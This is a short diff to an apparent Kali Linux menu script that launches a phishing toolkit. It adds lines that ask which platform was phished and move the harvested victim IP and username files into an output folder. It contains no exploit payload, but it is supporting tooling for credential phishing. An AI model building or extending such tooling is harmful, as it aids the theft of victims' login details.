@@ -18,6 +18,15 @@ do
   echo "Starting script... "
   cd /home/kali/Desktop/KOZ1OLMENU/Phisher
   ./Phisher.sh
+  echo "Saving data ... "
+  read -r -p "Which platform do you phish ? - " platform
+  cd /home/kali/Desktop/KOZ1OLMENU
+  mkdir pishing_output
+  cd /home/kali/Desktop/KOZ1OLMENU/Phisher/sites/$platform
+  mv saved.ip.txt /home/kali/Desktop/KOZ1OLMENU/pishing_output
+  mv saved.usernames.txt /home/kali/Desktop/KOZ1OLMENU/pishing_output
+  rm ip.txt
+  rm usernames.txt
   
   break
  ;;
